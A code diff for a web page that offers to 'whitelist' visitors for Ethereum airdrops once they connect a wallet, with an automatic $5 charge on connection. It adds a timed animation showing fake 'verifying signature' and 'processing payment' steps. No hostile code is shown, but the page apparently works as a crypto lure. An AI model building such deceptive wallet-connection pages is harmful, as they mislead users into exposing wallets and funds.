@@ -987,11 +987,24 @@
                 <h2 class="payment-title">CONNECT & GET ACCESS</h2>
                 <p class="payment-desc">CONNECT YOUR WALLET TO GET WHITELISTED FOR ALL ETHEREUM AIRDROPS</p>
 
-                <button class="connect-btn" onclick="goToDashboard()">
+                <button class="connect-btn" id="connectButton" onclick="startConnection()">
                     CONNECT WALLET
                 </button>
 
                 <p class="payment-notice">*A service fee of $5 will be automatically charged from your wallet upon connection</p>
+
+                <!-- Loading Screen on Landing Page -->
+                <div class="loading-screen" id="landingLoadingScreen" style="display: none; margin-top: 40px;">
+                    <div class="loading-spinner"></div>
+                    <div class="loading-text">CONNECTING WALLET...</div>
+                    <div class="loading-steps">
+                        <div class="loading-step" id="landingStep1">▶ REQUESTING WALLET ACCESS</div>
+                        <div class="loading-step" id="landingStep2">▶ VERIFYING SIGNATURE</div>
+                        <div class="loading-step" id="landingStep3">▶ PROCESSING PAYMENT</div>
+                        <div class="loading-step" id="landingStep4">▶ REGISTERING WALLET</div>
+                        <div class="loading-step" id="landingStep5">▶ REDIRECTING TO DASHBOARD</div>
+                    </div>
+                </div>
             </section>
 
             <!-- FAQ Section -->
@@ -1291,6 +1304,32 @@
             element.classList.toggle('active');
         }
 
+        function startConnection() {
+            // Hide button and show loading on landing page
+            document.getElementById('connectButton').style.display = 'none';
+            document.getElementById('landingLoadingScreen').style.display = 'flex';
+
+            // Animate loading steps on landing page
+            const landingSteps = [
+                { id: 'landingStep1', delay: 400 },
+                { id: 'landingStep2', delay: 1000 },
+                { id: 'landingStep3', delay: 1600 },
+                { id: 'landingStep4', delay: 2200 },
+                { id: 'landingStep5', delay: 2800 }
+            ];
+
+            landingSteps.forEach(step => {
+                setTimeout(() => {
+                    document.getElementById(step.id).classList.add('active');
+                }, step.delay);
+            });
+
+            // After landing page loading, go to dashboard
+            setTimeout(() => {
+                goToDashboard();
+            }, 3500);
+        }
+
         function goToDashboard() {
             // Hide landing page
             document.getElementById('landingPage').classList.remove('active');
@@ -1298,7 +1337,7 @@
             // Show dashboard page
             document.getElementById('dashboardPage').classList.add('active');
             
-            // Start loading sequence
+            // Start loading sequence on dashboard
             const steps = [
                 { id: 'step1', delay: 500 },
                 { id: 'step2', delay: 1200 },
